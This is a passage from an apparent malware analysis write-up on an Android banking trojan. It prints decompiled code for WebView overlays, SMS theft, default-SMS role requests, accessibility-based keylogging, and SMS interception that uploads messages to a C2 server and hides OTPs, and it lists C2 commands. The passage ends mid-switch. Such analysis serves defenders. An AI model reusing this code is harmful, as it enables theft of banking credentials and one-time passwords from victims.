        <span class="n">super</span><span class="p">.</span><span class="nf">onCreate</span><span class="p">(</span><span class="n">bundle0</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">getWindow</span><span class="p">().</span><span class="nf">setFlags</span><span class="p">(</span><span class="m">0x400</span><span class="p">,</span> <span class="m">0x400</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">requestWindowFeature</span><span class="p">(</span><span class="m">1</span><span class="p">);</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">s</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getIntent</span><span class="p">().</span><span class="nf">getStringExtra</span><span class="p">(</span><span class="s">"data"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">s</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="n">s</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">goto</span> <span class="n">label_107</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">try</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(!</span><span class="n">s</span><span class="p">.</span><span class="nf">isEmpty</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">this</span><span class="p">.</span><span class="nf">setContentView</span><span class="p">(</span><span class="m">0x7F0B001D</span><span class="p">);</span>
                <span class="n">WebView</span> <span class="n">webView0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">WebView</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="n">M</span> <span class="p">=</span> <span class="n">webView0</span><span class="p">;</span>
                <span class="n">webView0</span><span class="p">.</span><span class="nf">setWebViewClient</span><span class="p">(</span><span class="k">new</span> <span class="nf">WebViewClient</span><span class="p">());</span>
                <span class="k">this</span><span class="p">.</span><span class="n">M</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setJavaScriptEnabled</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="n">M</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setLoadWithOverviewMode</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="n">M</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setUseWideViewPort</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="n">M</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setSupportZoom</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="n">M</span><span class="p">.</span><span class="nf">addJavascriptInterface</span><span class="p">(</span><span class="k">new</span> <span class="n">com</span><span class="p">.</span><span class="n">ohalqpdj</span><span class="p">.</span><span class="n">discopet</span><span class="p">.</span><span class="n">Activity</span><span class="p">.</span><span class="nf">aa</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">),</span> <span class="s">"Android"</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="n">M</span><span class="p">.</span><span class="nf">loadDataWithBaseURL</span><span class="p">(</span><span class="s">"fake-url"</span><span class="p">,</span> <span class="s">"&lt;html&gt;&lt;/html&gt;"</span><span class="p">,</span> <span class="s">"text/html"</span><span class="p">,</span> <span class="s">"UTF-8"</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="n">I</span> <span class="p">=</span> <span class="p">(</span><span class="n">RelativeLayout</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="nf">findViewById</span><span class="p">(</span><span class="m">0x7F0801D5</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"url"</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">I</span><span class="p">.</span><span class="nf">addView</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">M</span><span class="p">);</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">M</span><span class="p">.</span><span class="nf">loadUrl</span><span class="p">(</span><span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="n">G</span><span class="p">);</span>
                    <span class="k">return</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"iWantA11"</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">I</span><span class="p">.</span><span class="nf">addView</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">M</span><span class="p">);</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">M</span><span class="p">.</span><span class="nf">loadUrl</span><span class="p">(</span><span class="s">"file:///android_asset/help.html"</span><span class="p">);</span>
                    <span class="k">return</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span><span class="p">(</span><span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="nf">m</span><span class="p">())</span> <span class="p">{</span>
                    <span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">();</span>
                    <span class="k">return</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">this</span><span class="p">.</span><span class="nf">M</span><span class="p">();</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>

        <span class="n">label_107</span><span class="p">:</span>
            <span class="n">c</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="nf">m</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="s">"WebActivity HTML_OVERLAY_URL: null"</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">M</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<h2 id="steal-sms">Steal SMS</h2>

<p>The malware collect the SMS stored in the victim’s device and send it to C2 server.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="k">protected</span> <span class="k">void</span> <span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span> <span class="n">bundle0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">super</span><span class="p">.</span><span class="nf">onCreate</span><span class="p">(</span><span class="n">bundle0</span><span class="p">);</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">();</span>
            <span class="k">new</span> <span class="nf">String</span><span class="p">(</span><span class="s">"ComposeSms onCreate"</span><span class="p">);</span>
            <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getIntent</span><span class="p">().</span><span class="nf">getStringExtra</span><span class="p">(</span><span class="s">"data"</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="n">b</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getIntent</span><span class="p">().</span><span class="nf">getStringExtra</span><span class="p">(</span><span class="s">"ats"</span><span class="p">);</span>
            <span class="kt">int</span> <span class="n">v</span> <span class="p">=</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
            <span class="kt">int</span> <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">hashCode</span><span class="p">();</span>
            <span class="k">if</span><span class="p">(</span><span class="n">v1</span> <span class="p">==</span> <span class="m">0xA7794C29</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"ADMIN_SMS"</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">v</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">v1</span> <span class="p">==</span> <span class="m">0x50BDF8FA</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"configSaveSMS"</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">v</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">v1</span> <span class="p">==</span> <span class="m">2031367170</span> <span class="p">&amp;&amp;</span> <span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"SEND_SMS"</span><span class="p">)))</span> <span class="p">{</span>
                <span class="n">v</span> <span class="p">=</span> <span class="m">2</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">if</span><span class="p">(</span><span class="n">v</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">switch</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">case</span> <span class="m">1</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">this</span><span class="p">.</span><span class="nf">m</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s">"android.permission.RECEIVE_SMS"</span><span class="p">},</span> <span class="m">0x7B</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="m">2</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">this</span><span class="p">.</span><span class="nf">m</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s">"android.permission.SEND_SMS"</span><span class="p">},</span> <span class="m">0x7B</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">default</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">c</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="nf">m</span><span class="p">(</span><span class="m">1</span><span class="p">,</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">().</span><span class="nf">insert</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="s">"ComposeSms bad data: "</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="n">s</span><span class="p">).</span><span class="nf">toString</span><span class="p">());</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">VERSION</span><span class="p">.</span><span class="n">SDK_INT</span> <span class="p">&gt;=</span> <span class="m">29</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">RoleManager</span> <span class="n">roleManager0</span> <span class="p">=</span> <span class="p">(</span><span class="n">RoleManager</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="nf">getSystemService</span><span class="p">(</span><span class="n">RoleManager</span><span class="p">.</span><span class="k">class</span><span class="err">);</span>
                <span class="nc">if</span><span class="p">((</span><span class="n">roleManager0</span><span class="p">.</span><span class="nf">isRoleAvailable</span><span class="p">(</span><span class="s">"android.app.role.SMS"</span><span class="p">))</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="n">roleManager0</span><span class="p">.</span><span class="nf">isRoleHeld</span><span class="p">(</span><span class="s">"android.app.role.SMS"</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">this</span><span class="p">.</span><span class="nf">startActivityForResult</span><span class="p">(</span><span class="n">roleManager0</span><span class="p">.</span><span class="nf">createRequestRoleIntent</span><span class="p">(</span><span class="s">"android.app.role.SMS"</span><span class="p">),</span> <span class="m">1</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="n">ServiceHandler</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="nf">m</span><span class="p">(</span><span class="k">null</span><span class="p">);</span>
                <span class="n">Intent</span> <span class="n">intent0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Intent</span><span class="p">(</span><span class="s">"android.provider.Telephony.ACTION_CHANGE_DEFAULT"</span><span class="p">);</span>
                <span class="n">intent0</span><span class="p">.</span><span class="nf">putExtra</span><span class="p">(</span><span class="s">"package"</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nf">getPackageName</span><span class="p">());</span>
                <span class="n">intent0</span><span class="p">.</span><span class="nf">addFlags</span><span class="p">(</span><span class="m">0x10000000</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="nf">startActivity</span><span class="p">(</span><span class="n">intent0</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">this</span><span class="p">.</span><span class="nf">finish</span><span class="p">();</span>
    <span class="p">}</span>

</code></pre></div></div>

<h2 id="keylogging">Keylogging</h2>

<p>The malware has the capabbility to store key strokes of the victim using startkeylogs. This helps to steal the victim’s banking credentials or login credentials.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">void</span> <span class="nf">onAccessibilityEvent</span><span class="p">(</span><span class="n">AccessibilityEvent</span> <span class="n">accessibilityEvent0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">String</span> <span class="n">s1</span><span class="p">;</span>
        <span class="n">String</span> <span class="n">s</span><span class="p">;</span>
        <span class="n">AccessibilityNodeInfo</span> <span class="n">accessibilityNodeInfo0</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">accessibilityEvent0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getPackageName</span><span class="p">()</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">accessibilityNodeInfo0</span> <span class="p">=</span> <span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getSource</span><span class="p">();</span>
                    <span class="k">if</span><span class="p">(</span><span class="n">accessibilityNodeInfo0</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">accessibilityNodeInfo0</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getRootInActiveWindow</span><span class="p">();</span>
                        <span class="k">if</span><span class="p">(</span><span class="n">accessibilityNodeInfo0</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">return</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="p">}</span>

                    <span class="n">accessibilityNodeInfo0</span><span class="p">.</span><span class="nf">refresh</span><span class="p">();</span>
                    <span class="n">s</span> <span class="p">=</span> <span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getPackageName</span><span class="p">().</span><span class="nf">toString</span><span class="p">();</span>
                    <span class="n">s1</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">m</span><span class="p">(</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getEventType</span><span class="p">());</span>
                    <span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">b</span> <span class="p">==</span> <span class="k">null</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">getPackageName</span><span class="p">())</span> <span class="p">&amp;&amp;</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">G</span> <span class="p">&gt;</span> <span class="m">0</span> <span class="p">||</span> <span class="p">(</span><span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="nf">m</span><span class="p">(</span><span class="s">"sniffer"</span><span class="p">,</span> <span class="n">s</span><span class="p">))))</span> <span class="p">{</span>
                        <span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">G</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
                            <span class="kt">int</span> <span class="n">v</span> <span class="p">=</span> <span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getEventType</span><span class="p">();</span>
                            <span class="k">goto</span> <span class="n">label_46</span><span class="p">;</span>
                        <span class="p">}</span>

                        <span class="k">goto</span> <span class="n">label_65</span><span class="p">;</span>
                    <span class="p">}</span>

                    <span class="k">goto</span> <span class="n">label_90</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">}</span>

            <span class="k">return</span><span class="p">;</span>
        <span class="n">label_46</span><span class="p">:</span>
            <span class="k">if</span><span class="p">(</span><span class="n">v</span> <span class="p">==</span> <span class="m">16</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">try</span> <span class="p">{</span>
                    <span class="n">JSONObject</span> <span class="n">jSONObject0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">();</span>
                    <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"logsKeylogger"</span><span class="p">,</span> <span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getText</span><span class="p">().</span><span class="nf">toString</span><span class="p">());</span>
                    <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"package"</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
                    <span class="n">b</span><span class="p">.</span><span class="nf">m</span><span class="p">(</span><span class="n">App</span><span class="p">.</span><span class="nf">m</span><span class="p">()).</span><span class="nf">a</span><span class="p">(</span><span class="n">jSONObject0</span><span class="p">.</span><span class="nf">toString</span><span class="p">());</span> <span class="c1">// save logs</span>
                <span class="p">}</span>
                <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                <span class="p">}</span>
            <span class="p">}</span>
</code></pre></div></div>

<h2 id="intercept-sms">Intercept SMS</h2>

<p>Then the malware will intercept the coming SMS. This makes the received SMS hidden from the victim. This useful for the attacker to get OTP.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">public</span> <span class="k">void</span> <span class="nf">onReceive</span><span class="p">(</span><span class="n">Context</span> <span class="n">context0</span><span class="p">,</span> <span class="n">Intent</span> <span class="n">intent0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(((</span><span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="n">l</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"yes"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">m</span><span class="p">(</span><span class="n">App</span><span class="p">.</span><span class="nf">m</span><span class="p">())))</span> <span class="p">&amp;&amp;</span> <span class="p">(</span><span class="n">intent0</span><span class="p">.</span><span class="nf">getAction</span><span class="p">().</span><span class="k">equals</span><span class="p">(</span><span class="s">"android.provider.Telephony.SMS_RECEIVED"</span><span class="p">)))</span> <span class="p">{</span>
                <span class="n">Bundle</span> <span class="n">bundle0</span> <span class="p">=</span> <span class="n">intent0</span><span class="p">.</span><span class="nf">getExtras</span><span class="p">();</span>
                <span class="k">if</span><span class="p">(</span><span class="n">bundle0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">Object</span><span class="p">[]</span> <span class="n">arr_object</span> <span class="p">=</span> <span class="p">(</span><span class="n">Object</span><span class="p">[])</span><span class="n">bundle0</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"pdus"</span><span class="p">);</span>
                    <span class="k">if</span><span class="p">(</span><span class="n">arr_object</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="kt">int</span> <span class="n">v</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
                        <span class="k">while</span><span class="p">(</span><span class="n">v</span> <span class="p">&lt;</span> <span class="n">arr_object</span><span class="p">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
                            <span class="n">SmsMessage</span> <span class="n">smsMessage0</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">m</span><span class="p">(</span><span class="n">arr_object</span><span class="p">[</span><span class="n">v</span><span class="p">],</span> <span class="n">bundle0</span><span class="p">);</span>
                            <span class="p">++</span><span class="n">v</span><span class="p">;</span>
                            <span class="k">this</span><span class="p">.</span><span class="n">b</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">().</span><span class="nf">insert</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="n">smsMessage0</span><span class="p">.</span><span class="nf">getDisplayOriginatingAddress</span><span class="p">()).</span><span class="nf">append</span><span class="p">(</span><span class="s">":"</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="n">smsMessage0</span><span class="p">.</span><span class="nf">getDisplayMessageBody</span><span class="p">()).</span><span class="nf">toString</span><span class="p">();</span>
                        <span class="p">}</span>

                        <span class="n">aa</span> <span class="n">aa0</span> <span class="p">=</span> <span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">();</span>
                        <span class="n">aa0</span><span class="p">.</span><span class="n">j</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">;</span>
                        <span class="n">JSONObject</span> <span class="n">jSONObject0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">();</span>
                        <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"smsLogs"</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">);</span>
                        <span class="n">c</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="nf">m</span><span class="p">(</span><span class="n">jSONObject0</span><span class="p">);</span> <span class="c1">// upload to C2 server</span>
                    <span class="p">}</span>

                    <span class="k">this</span><span class="p">.</span><span class="nf">abortBroadcast</span><span class="p">();</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<h2 id="commands">Commands</h2>

<p>This commands will be received from C2 server to the victim.</p>

<p>stopAll: is used to reset/stop the ATS feature, stopping the in progress automation.</p>

<p>smsSend: used to send a text message to the specified phone number by the TAs</p>

<p>openPackage: used to open the specified app from the infected device.</p>

<p>removeApp: used to uninstall the specified app from the infected device</p>

<p>getDoze: used to check if the permissions to ignore battery optimization are enabled, and show the Android settings to disable them if they aren’st</p>

<p>ats: used to enable ATS attacks. It includes a JSON array with the different events/actions it should simulate to perform ATS (button clicks, etc.)</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="n">jSONObject1</span><span class="p">.</span><span class="nf">has</span><span class="p">(</span><span class="s">"command"</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">();</span>
                <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">().</span><span class="nf">insert</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="s">"onApiRequestDone: "</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="n">jSONObject1</span><span class="p">).</span><span class="nf">toString</span><span class="p">();</span>
                <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="n">jSONObject1</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="s">"command"</span><span class="p">);</span>
                <span class="kt">int</span> <span class="n">v</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">hashCode</span><span class="p">();</span>
                <span class="k">switch</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">case</span> <span class="m">0x8BD150FC</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">boolean</span> <span class="n">z</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"updateLib"</span><span class="p">);</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">z</span> <span class="p">?</span> <span class="m">2</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="m">0x8FAEE23F</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"stopAll"</span><span class="p">)</span> <span class="p">?</span> <span class="m">8</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="p">-</span><span class="m">1003888996</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"openPackage"</span><span class="p">)</span> <span class="p">?</span> <span class="m">4</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="p">-</span><span class="m">875734902</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"unlockPhone"</span><span class="p">)</span> <span class="p">?</span> <span class="m">0</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="m">0xEA9E40DA</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"deleteLib"</span><span class="p">)</span> <span class="p">?</span> <span class="m">1</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="p">-</span><span class="m">122979700</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"enableKeyLogger"</span><span class="p">)</span> <span class="p">?</span> <span class="m">9</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="m">0xFA4F7FCD</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"AntiDelete"</span><span class="p">)</span> <span class="p">?</span> <span class="m">5</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="p">-</span><span class="m">75592340</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"getDoze"</span><span class="p">)</span> <span class="p">?</span> <span class="m">7</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="m">0x17AA0</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"ats"</span><span class="p">)</span> <span class="p">?</span> <span class="m">12</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="m">1097035112</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">v1</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"iWantA11"</span><span class="p">)</span> <span class="p">?</span> <span class="m">6</span> <span class="p">:</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="m">1255329260</span><span class="p">:</span> <span class="p">{</span>
